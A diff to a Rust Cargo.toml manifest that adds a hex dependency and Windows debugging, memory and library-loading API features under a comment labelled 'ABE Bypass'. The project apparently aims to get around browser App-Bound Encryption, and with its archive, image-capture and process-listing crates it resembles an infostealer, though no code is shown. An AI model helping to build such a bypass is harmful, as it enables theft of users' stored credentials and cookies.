@@ -15,6 +15,7 @@ panic     = "abort"
 
 [dependencies]
 base64      = "0.22"
+hex         = "0.4"
 serde_json  = "1"
 zip         = "0.6"
 image       = { version = "0.25", default-features = false, features = ["jpeg"] }
@@ -40,4 +41,9 @@ windows = { version = "0.58", features = [
     "Win32_System_Threading",
     "Win32_System_ProcessStatus",
     "Win32_Storage_FileSystem",
+    # Debugging (ABE Bypass)
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_Memory",
+    "Win32_System_LibraryLoader",
+    "Win32_System_SystemServices",
 ] }
